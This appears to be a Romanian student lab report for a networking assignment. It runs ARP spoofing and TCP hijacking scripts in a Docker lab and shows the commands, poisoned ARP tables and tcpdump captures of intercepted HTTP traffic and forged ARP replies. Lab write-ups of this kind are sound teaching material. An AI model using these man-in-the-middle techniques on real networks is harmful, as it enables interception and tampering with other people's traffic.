# Tema 5

## 1. ARP Spoofing (5%)

Pornim script-ul `src/arp_spoof.py` pe container-ul `middle`:
```sh
$ docker-compose exec middle python3 /elocal/src/arp_spoof.py
```

Mai întâi, acesta determină adresele MAC ale router-ului și ale server-ului,
ca să știe unde să trimită reply-urile ARP:
```
IP 198.7.0.2 has MAC 02:42:c6:07:00:02
IP 198.7.0.1 has MAC 02:42:c6:07:00:01
```

După aceea, construiește pachetele ARP reply și începe să le
transmită la intervale regulate pe rețea:
```
Telling 198.7.0.1 we have IP 198.7.0.2
Telling 198.7.0.2 we have IP 198.7.0.1
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
...
```

Pe server rulăm un `wget`:
```
$ docker-compose exec server wget example.com
--2020-06-24 06:59:00--  http://example.com/
Resolving example.com (example.com)...
```

În acest moment, observăm că pe server avem adresa MAC a noastră pentru IP-ul router-ului:
```
$ docker-compose exec server arp
Address                  HWtype  HWaddress           Flags Mask            Iface
tema-5-the-masks_router  ether   02:42:c6:07:00:03   C                     eth0
tema-5-the-masks_middle  ether   02:42:c6:07:00:03   C                     eth0
```

### Output tcpdump

Pe `middle` pornim `tcpdump -SntvXX -i any`. De pe server facem din nou `wget`.
Observăm că interceptăm mesajele HTTP ale server-ului:
```sh
$ docker-compose exec middle tcpdump -SntvXX -i any
...
IP (tos 0x0, ttl 64, id 38277, offset 0, flags [DF], proto TCP (6), length 190)
    198.7.0.2.55218 > 93.184.216.34.80: Flags [P.], cksum 0xfc94 (incorrect -> 0xf3ac), seq 3109930171:3109930309, ack 2279850264, win 502, options [nop,nop,TS val 739984417 ecr 4160807878], length 138: HTTP, length: 138
        GET / HTTP/1.1
        User-Agent: Wget/1.20.3 (linux-gnu)
        Accept: */*
        Accept-Encoding: identity
        Host: example.com
        Connection: Keep-Alive

        0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
        0x0010:  4500 00be 9585 4000 4006 a8d0 c607 0002  E.....@.@.......
        0x0020:  5db8 d822 d7b2 0050 b95d c4bb 87e3 c118  ].."...P.]......
        0x0030:  8018 01f6 fc94 0000 0101 080a 2c1b 4421  ............,.D!
        0x0040:  f800 e3c6 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
        0x0050:  2e31 0d0a 5573 6572 2d41 6765 6e74 3a20  .1..User-Agent:.
        0x0060:  5767 6574 2f31 2e32 302e 3320 286c 696e  Wget/1.20.3.(lin
        0x0070:  7578 2d67 6e75 290d 0a41 6363 6570 743a  ux-gnu)..Accept:
        0x0080:  202a 2f2a 0d0a 4163 6365 7074 2d45 6e63  .*/*..Accept-Enc
        0x0090:  6f64 696e 673a 2069 6465 6e74 6974 790d  oding:.identity.
        0x00a0:  0a48 6f73 743a 2065 7861 6d70 6c65 2e63  .Host:.example.c
        0x00b0:  6f6d 0d0a 436f 6e6e 6563 7469 6f6e 3a20  om..Connection:.
        0x00c0:  4b65 6570 2d41 6c69 7665 0d0a 0d0a       Keep-Alive....
...
```

## 2. TCP Hijacking (5%)


Am creat script-ul `middle.py` care primeste pachetele de tip TCP de la router, le modifica si le trimite catre server, ca si cum ar fi router-ul.
In tot acest timp, script-ul `src/arp_spoof.py` ramane pornit.

Pe container-ul `middle` pornim scipt-ul `middle.py`:
```
$ docker-compose exec middle python3 /elocal/src/middle.py

.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
...
```

Pe container-ul `client` pornim script-ul `tcp_client.py`:
```
$ docker-compose exec client python3 /elocal/src/tcp_client.py

[LINE:17]# INFO     [2020-06-29 19:37:58,309]  Handshake cu ('198.7.0.2', 10000)
[LINE:22]# INFO     [2020-06-29 19:38:01,328]  Content primit: "b'Server a primit mesajul: :)'"
[LINE:25]# INFO     [2020-06-29 19:38:01,328]  closing socket
```

Pe container-ul `server` pornim script-ul `tcp_server.py`:
```
$ docker-compose exec server python3 /elocal/src/tcp_server.py

[LINE:14]# INFO     [2020-06-29 19:37:49,016]  Serverul a pornit pe 198.7.0.2 si portnul portul 10000
[LINE:17]# INFO     [2020-06-29 19:37:49,017]  Asteptam conexiui...
[LINE:19]# INFO     [2020-06-29 19:37:58,310]  Handshake cu ('198.7.0.3', 49468)
[LINE:22]# INFO     [2020-06-29 19:38:01,327]  Content primit: "b':)'"
[LINE:17]# INFO     [2020-06-29 19:38:01,328]  Asteptam conexiui...
```


Daca rulam `tcpdump` pe server, putem vedea ca el crede ca primeste pachetul de la router:
```
$ docker-compose exec server tcpdump -SntvXX -i any

tcpdump: listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.1 is-at 02:42:c6:07:00:03, length 28
        0x0000:  0000 0001 0006 0242 c607 0003 0000 0806  .......B........
        0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
        0x0020:  0001 0242 c607 0002 c607 0002            ...B........
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.1 is-at 02:42:c6:07:00:03, length 28
        0x0000:  0000 0001 0006 0242 c607 0003 0000 0806  .......B........
        0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
        0x0020:  0001 0242 c607 0002 c607 0002            ...B........
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.1 is-at 02:42:c6:07:00:03, length 28
        0x0000:  0000 0001 0006 0242 c607 0003 0000 0806  .......B........
        0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
        0x0020:  0001 0242 c607 0002 c607 0002            ...B........
        ...
        ```
